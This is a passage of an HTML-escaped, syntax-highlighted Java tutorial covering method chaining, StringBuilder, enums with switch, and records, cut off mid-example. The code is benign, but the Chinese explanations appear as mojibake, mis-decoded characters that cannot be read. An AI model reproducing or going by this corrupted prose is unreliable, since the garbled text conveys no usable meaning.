&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#111">adder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Adder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">3&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">10&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Adder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">++;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>StringBuffer&lt;/code>å’Œ&lt;code>StringBuilder&lt;/code>æŽ¥å£å®Œå…¨ç›¸åŒï¼Œæ˜¯æ—©æœŸç‰ˆæœ¬ï¼Œé€šè¿‡åŒæ­¥æ¥ä¿è¯å¤šä¸ªçº¿ç¨‹æ“ä½œ&lt;code>StringBuffer&lt;/code>ä¹Ÿæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯åŒæ­¥ä¼šå¸¦æ¥æ‰§è¡Œé€Ÿåº¦çš„ä¸‹é™&lt;/li>
&lt;/ul>
&lt;h3 id="enum">enum&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SAT&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// åªéœ€ä¾æ¬¡åˆ—å‡ºæžšä¸¾çš„å¸¸é‡å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>å¸¸é‡æœ¬èº«å¸¦æœ‰ç±»åž‹ä¿¡æ¯ï¼Œå³&lt;code>Weekday.SUN&lt;/code>ç±»åž‹æ˜¯&lt;code>Weekday&lt;/code>ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ£€æŸ¥å‡ºç±»åž‹é”™è¯¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸å¯èƒ½å¼•ç”¨åˆ°éžæžšä¸¾çš„å€¼ï¼Œå› ä¸ºæ— æ³•é€šè¿‡ç¼–è¯‘&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸åŒç±»åž‹çš„æžšä¸¾ä¸èƒ½äº’ç›¸æ¯”è¾ƒæˆ–è€…èµ‹å€¼ï¼Œå› ä¸ºç±»åž‹ä¸ç¬¦&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>è™½ç„¶ä¹Ÿæ˜¯å¼•ç”¨ç±»åž‹ï¼Œä½†å› ä¸ºå…¶åœ¨JVMä¸­åªæœ‰å”¯ä¸€å®žä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æŽ¥ç”¨&lt;code>==&lt;/code>æ¯”è¾ƒ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç»§æ‰¿è‡ª&lt;code>java.lang.Enum&lt;/code>ï¼Œæ— æ³•è¢«ç»§æ‰¿ï¼Œæ— æ³•newå®žä¾‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æžšä¸¾ç±»çš„å­—æ®µä¹Ÿå¯ä»¥æ˜¯éžfinalç±»åž‹ï¼Œå³å¯ä»¥åœ¨è¿è¡ŒæœŸä¿®æ”¹ï¼Œä½†æ˜¯ä¸æŽ¨èè¿™æ ·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¤©ç”Ÿé€‚åˆswitchï¼Œå…·æœ‰ç±»åž‹ä¿¡æ¯å’Œæœ‰é™ä¸ªæžšä¸¾å¸¸é‡&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cannot process &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="record">record&lt;/h3>
&lt;p>java14å¼€å§‹&lt;/p>
&lt;ul>
&lt;li>ä¸å˜ç±»çš„classå’Œå­—æ®µéƒ½ä½¿ç”¨&lt;code>final&lt;/code>å…³é”®å­—ï¼Œæ— æ³•æ´¾ç”Ÿå­ç±»ï¼Œåˆ›å»ºå®žä¾‹åŽæ— æ³•ä¿®æ”¹ä»»ä½•å­—æ®µ&lt;/li>
&lt;li>åˆ›å»ºä¸å˜ç±»åŽä¸ºäº†ä¿è¯ä¸å˜ç±»çš„æ¯”è¾ƒï¼Œè¿˜éœ€è¦æ­£ç¡®è¦†å†™&lt;code>equals()&lt;/code>å’Œ&lt;code>hashCode()&lt;/code>æ–¹æ³•ï¼Œæ‰‹åŠ¨è¦†å†™å¾ˆéº»çƒ¦ï¼Œå¯ä»¥ç›´æŽ¥ç”¨recordä¸€è¡Œå†™å‡ºä¸å˜ç±»&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åŽä¸€è¡Œç›¸å½“äºŽ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
